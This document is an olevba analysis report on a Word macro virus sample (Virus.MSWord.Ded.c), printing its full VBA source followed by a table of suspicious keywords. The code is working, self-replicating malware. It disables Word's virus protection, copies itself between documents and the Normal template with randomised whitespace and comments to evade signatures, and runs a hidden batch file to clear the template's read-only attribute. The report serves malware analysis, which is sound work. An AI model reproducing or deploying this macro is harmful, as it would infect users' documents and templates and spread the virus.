olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.c-f4c864c5a962526c1b6b84841a57eded3b8a1ad7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.c-f4c864c5a962526c1b6b84841a57eded3b8a1ad7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 _
    Private Sub Document_New()

End Sub
'70,90379
 _
    Private Sub Document_Close()

 _
   On Error GoTo skam

 _
  Options.VirusProtection = False

   SWL
'64,78212
 _
      ABS99

skam:
'24,39314
           End Sub
'10,30226
 _
 Private Sub SWL()

 _
     If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

     For i _
= 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

 _
  d = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
     If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

 _
While Mid(d, Len(d) - 1, 2) = " _"

               i = i _
+ 1

 _
d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
Wend

       d = _
e(d)

 _
           ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d

 _
        End If

      Next i
'78,39953
 _
  ActiveDocument.SaveAs AddToRecentFiles:=False

                  End _
If

   End Sub
'53,02125
 _
     Private Sub ABS99()

 _
      If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

 _
     f (NormalTemplate.FullName)

 _
 For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

 _
  d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
  If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

              While _
Mid(d, Len(d) - 1, 2) = " _"

 _
 i = i + 1

         d = Left(d, Len(d) - _
1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
 Wend

        d _
= e(d)

      NormalTemplate.VBProject. _
VBComponents(1).CodeModule.InsertLines i * 2, d

    End If
'56,10093
 _
Next i

    NormalTemplate.Save
'10,44323
 _
End If

 _
           End Sub

 _
Private Function e(aString) As String

 _
  For i = 1 To Len(aString) - 1

 _
 While Mid(aString, i, 2) = " "

 _
          aString = Left(aString, i) & Right(aString, Len(aString) - i - 1)

              Wend
'32,6144
 _
        If Mid(aString, i, 1) = "." Then

 _
If Not Mid(aString, i - 1, 1) = Chr$(34) And Not Mid(aString, i + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

 _
If Not Mid(aString, i + 1, 1) = Chr$(34) Then

 _
 e = Left(aString, i - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - i)

      For j _
= 1 To Int(15 * Rnd)

 _
    e = " " & e

 _
Next j

 _
         Exit Function

 _
End If

 _
  End If

 _
        Else

 _
      If Mid(aString, i, 1) = " " And Int(3 * Rnd) = 1 And i > 1 Then

 _
          If Not Mid(aString, i + 1, 1) = Chr$(34) And Not Mid(aString, i - 1, 1) = Chr$(34) Then

         e = _
Left(aString, i - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - i)

 _
       For j = 1 To Int(15 * Rnd)

   e = " " & _
e

 _
Next j

           Exit _
Function

 _
 End If

 _
        End If

         End If
'0,4019678
 _
Next i

 _
e = aString & Chr$(13) & "'" & (100 * Rnd)

        Count = _
Int(15 * Rnd)

 _
       For j = 1 To Count

 _
      e = " " & e

 _
      Next j

 _
      End Function

         Private Sub f(fName)
'37,5816
 _
      If GetAttr(fName) And vbReadOnly Then

           Open Dir(fName) & ".bat" For _
Append As #1

  Print _
#1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

 _
      Print #1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

 _
  Close #1

          shellResult = Shell(Dir(fName) & ".bat", vbHide)
'58,03871
 _
           End If

         End Sub
'92,54505
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

